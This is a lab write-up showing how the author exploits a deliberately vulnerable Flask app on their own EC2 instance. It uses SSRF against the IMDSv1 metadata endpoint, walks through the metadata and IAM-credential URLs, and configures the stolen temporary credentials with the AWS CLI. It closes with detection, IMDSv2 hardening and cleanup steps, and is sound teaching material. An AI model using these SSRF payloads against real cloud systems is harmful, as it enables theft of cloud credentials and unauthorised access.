---
title: "Part 11 - Attack 2: Metadata SSRF Attack on EC2"
date: 2026-05-30
description: "Exploiting a Server-Side Request Forgery (SSRF) vulnerability in a Flask web application to access the EC2 Instance Metadata Service, enumerate instance details, extract temporary IAM credentials, and use them to access AWS services."

tags:
  - cybersecurity
  - cloudlab
  - ca101
  - aws

categories:
  - cloudlab writeup
  - cloud and attacks 101
---

> **Disclaimer:** All IAM credentials, public IP addresses, and sensitive data shown in this writeup have been removed, and the entire AWS environment was securely cleaned up prior to publication.


# Attack 2 — Metadata SSRF Attack on EC2

## Prerequisites

Before starting, I made sure the following were in place:

1. `projectx-prod-vpc` has been created with subnets configured
2. `My-Desktop-Key-Pair` key pair exists
3. AWS CLI configured with appropriate IAM credentials

## Scenario

The attacker discovers a web application running on a public EC2 instance that accepts a URL as input and fetches the content server-side — a typical feature found in link preview services, PDF generators, and webhook validators. There is no URL validation. The attacker supplies the EC2 Instance Metadata Service (IMDS) address instead of a legitimate URL, causing the server to fetch its own metadata and return it to the attacker. The metadata service is running IMDSv1, which requires no session token, so the credentials are returned in a single unauthenticated request.

---

## Overview

### What is SSRF?

**Server-Side Request Forgery (SSRF)** is a vulnerability where an attacker tricks a server into making HTTP requests on their behalf. The server becomes a proxy — and because requests originate from the server itself, they can reach internal resources that would normally be inaccessible from the internet.

SSRF vulnerabilities typically live wherever an application accepts user-supplied URLs: image upload services that fetch a URL, webhooks that validate a callback endpoint, link previews, PDF generators, or API proxies.

### What is the EC2 Instance Metadata Service (IMDS)?

Every EC2 instance has access to a special HTTP endpoint at `169.254.169.254` that returns metadata about itself. This includes:

- **Instance details** — instance ID, type, AMI, region, availability zone
- **Network information** — MAC address, private IP, security groups
- **IAM credentials** — temporary `AccessKeyId`, `SecretAccessKey`, and `SessionToken` for the attached IAM role
- **User data** — the startup script passed at launch, which often contains secrets

The metadata service is only reachable from within the instance itself — which is why SSRF is the attack vector. The vulnerable web application running *on* the instance makes the metadata request on the attacker's behalf.

**IMDSv1 vs IMDSv2**: IMDSv1 allows direct unauthenticated GET requests. IMDSv2 requires a session token obtained through a PUT request first, which breaks most SSRF exploits. Many instances still run IMDSv1, making them vulnerable.

### What Makes an Application Vulnerable to SSRF?

- **No URL validation** — the application accepts any URL without checking if it points to internal or restricted resources
- **No allowlist for permitted domains** — requests are not restricted to a known-safe set of external hosts
- **IMDSv1 enabled** — the metadata endpoint can be reached with a simple GET request

---

## Deploy the Vulnerable EC2 Instance

### Step 1 — Deploy via CloudFormation

I navigated to **CloudFormation → Create stack → Choose an existing template**.

Upload `metadata-ssrf-ec2.yaml` from the exercise files repository (https://github.com/projectsecio/exercise-files/tree/main/cloud-attacks-101/attacks_cf_templates): 

[Download Template](metadata_ssrf_ec2.yaml)

Configure parameters:
- **Stack name:** `metadata-ssrf-ec2`
- **InstanceName:** `delete-me-ssrf-ec2`
- **KeyPairName:** `My-Desktop-Key-Pair`
- **VpcId:** `projectx-prod-vpc`
- **SubnetId:** Select the public subnet

I selected **Submit** and wait for **CREATE_COMPLETE**.

> 📝 The template deploys a Flask web application with IMDSv1 enabled and an IAM role with `AmazonS3ReadOnlyAccess` attached — the S3 permissions demonstrate what an attacker can do with the stolen credentials.

![CloudFormation Outputs tab showing the `InstancePublicIP` and `InstanceId` values — the public IP is what we'll use to access the vulnerable application.](screenshot1.png)

---

### Step 2 — Get the Instance Public IP

```bash
INSTANCE_ID=$(aws cloudformation describe-stacks \
  --stack-name metadata-ssrf-ec2 \
  --query 'Stacks[0].Outputs[?OutputKey==`InstanceId`].OutputValue' \
  --output text)

PUBLIC_IP=$(aws ec2 describe-instances \
  --instance-ids $INSTANCE_ID \
  --query 'Reservations[0].Instances[0].PublicIpAddress' \
  --output text)

echo "Target: http://$PUBLIC_IP"
```

---

### Step 3 — I verified the Application is Running

Wait 2-3 minutes for the user data script to complete, then visit `http://<public-ip>` in a browser.

I received a simple web form with a URL input field.

![Browser showing the vulnerable Flask application at `http://<public-ip>` — a URL input form with a submit button, no authentication required.](screenshot2.png)

---

## Discovery Phase

### Step 4 — Test the SSRF Vulnerability

First, confirm the application actually fetches URLs by testing with a legitimate public URL:

```
http://example.com
```

The application should return the content of `example.com` — confirming it makes server-side HTTP requests based on user input.

![The application form showing `http://google.com` entered, and the response showing the content of example.com rendered — confirming the SSRF vector works.](screenshot3.png)

Now test if internal addresses are reachable:

```
http://127.0.0.1
http://localhost
http://169.254.169.254
```

![The application form showing `http://169.254.169.254` entered and the response returning the IMDS root page — a list of available metadata paths like `ami-id`, `instance-id`, `iam/`, confirming SSRF access to the metadata service.](screenshot4.png)

If `169.254.169.254` returns content, the SSRF vulnerability is confirmed and the metadata service is reachable.

---

## Enumeration Phase

### Step 5 — Access the Metadata Root

Enter the IMDS root endpoint into the form:

```
http://169.254.169.254/latest/meta-data/
```

The response lists all available metadata paths:

```
ami-id
instance-id
instance-type
iam/
network/
placement/
security-groups
```

### Step 6 — Enumerate Instance Details

Collect information about the instance:

**Basic details:**
```
http://169.254.169.254/latest/meta-data/instance-id
http://169.254.169.254/latest/meta-data/instance-type
http://169.254.169.254/latest/meta-data/ami-id
http://169.254.169.254/latest/meta-data/placement/availability-zone
http://169.254.169.254/latest/meta-data/placement/region
```

**Network information:**
```
http://169.254.169.254/latest/meta-data/public-ipv4
http://169.254.169.254/latest/meta-data/local-ipv4
http://169.254.169.254/latest/meta-data/network/interfaces/macs/
```

**Security groups:**
```
http://169.254.169.254/latest/meta-data/security-groups
```

![Application showing the response to `http://169.254.169.254/latest/meta-data/instance-id` — the instance ID returned, and separately the response to `placement/region` showing the region. These demonstrate useful reconnaissance data being returned.](screenshot5.png)

### Step 7 — Identify the IAM Role

Check if an IAM role is attached to the instance:

```
http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

This returns the name of the IAM role attached to the instance.

![Application form response showing the IAM role name returned from the `iam/security-credentials/` path — this is the role name needed for the next step.](screenshot6.png)

---

## Exploitation Phase

### Step 8 — Extract IAM Credentials

I used the role name discovered in the previous step to extract its temporary credentials:

```
http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>
```

The response is a JSON object containing:

```json
{
  "Code": "Success",
  "LastUpdated": "2026-05-27T12:00:00Z",
  "Type": "AWS-HMAC",
  "AccessKeyId": "ASIA...",
  "SecretAccessKey": "...",
  "Token": "...",
  "Expiration": "2026-05-27T18:00:00Z"
}
```

![Application response showing the full JSON IAM credential object — `AccessKeyId`, `SecretAccessKey`, and `Token` visible. This is the critical exploitation screenshot showing temporary AWS credentials extracted via SSRF.](screenshot7.png)

> 📝 These are temporary credentials. They rotate automatically every few hours and include a session token. They carry exactly the permissions of the IAM role attached to the instance.

---

### Step 9 — I used the Stolen Credentials

Configure a new AWS CLI profile with the extracted credentials:

```bash
aws configure --profile ssrf

# When prompted, enter:
# AWS Access Key ID: <AccessKeyId from response>
# AWS Secret Access Key: <SecretAccessKey from response>
# Default region: ap-southeast-1
# Default output format: json

# Also set the session token (required for temporary credentials)
aws configure set aws_session_token <Token> --profile ssrf
```

I verified the credentials work:

```bash
aws sts get-caller-identity --profile ssrf
```

![Terminal showing `aws sts get-caller-identity --profile ssrf` returning a JSON response with the role ARN — confirming the stolen credentials are valid and authenticated.](screenshot8.png)

Test what the role can access (the attached role has `AmazonS3ReadOnlyAccess`):

```bash
aws s3 ls --profile ssrf
```

![Terminal showing `aws s3 ls --profile ssrf` listing S3 buckets in the account — confirming the stolen credentials can access AWS services with the permissions of the EC2 instance's IAM role.](screenshot9.png)

### Step 10 — Check User Data for Additional Secrets

User data scripts executed at launch often contain hardcoded credentials or configuration values:

```
http://169.254.169.254/latest/user-data
```

In a real environment, user data may contain database passwords, API keys, or AWS credentials passed to the instance at startup. Even if this specific instance's user data is clean, it's always worth checking.

---

## Potential Impact

With IAM credentials extracted via SSRF, an attacker can:

- **Access any AWS service** the IAM role has permissions for — S3, EC2, RDS, Secrets Manager, and more
- **Lateral movement** — use the credentials to assume other roles, access other accounts, or pivot to resources not directly exposed
- **Data exfiltration** — read S3 buckets, query databases, access secrets
- **Privilege escalation** — if the role has `iam:*` or `sts:AssumeRole` permissions, escalate to full administrative access
- **Persistence** — create new IAM users or access keys before the temporary credentials expire

---

## Detection and Prevention

**How to detect this:**
- **CloudTrail** — IAM credential usage from the EC2 instance's IP address is normal; usage from an *external* IP is a strong indicator that credentials were stolen via SSRF
- **GuardDuty** — detects credentials used outside of expected context and `UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration` findings
- **VPC Flow Logs** — unusual outbound connections from the application server to external IPs carrying credential material

**How to prevent it:**
- **Enable IMDSv2** — requires a PUT request for a session token before metadata is accessible, breaking most SSRF exploits. Enforce it at the instance level: `aws ec2 modify-instance-metadata-options --instance-id <id> --http-token required`
- **Validate and allowlist URLs** — applications that need to fetch external URLs should validate against an allowlist of permitted domains, and explicitly block `169.254.0.0/16`
- **Apply least privilege to IAM roles** — the metadata service only exposes the permissions the role actually has. A role with `AmazonS3ReadOnlyAccess` is far less damaging to lose than one with `AdministratorAccess`
- **Use IMDSv2 organisation-wide** — set an SCP or IAM condition that requires `ec2:MetadataHttpTokens: required` for all instances

---

## Cleanup

```bash
aws cloudformation delete-stack --stack-name metadata-ssrf-ec2
aws cloudformation wait stack-delete-complete --stack-name metadata-ssrf-ec2
```

> Remove the `ssrf` AWS CLI profile after the exercise: delete the relevant entries from `~/.aws/credentials` and `~/.aws/config`.

---

*Next up — Part 12 - Attack 3: Insecure API Gateway.*
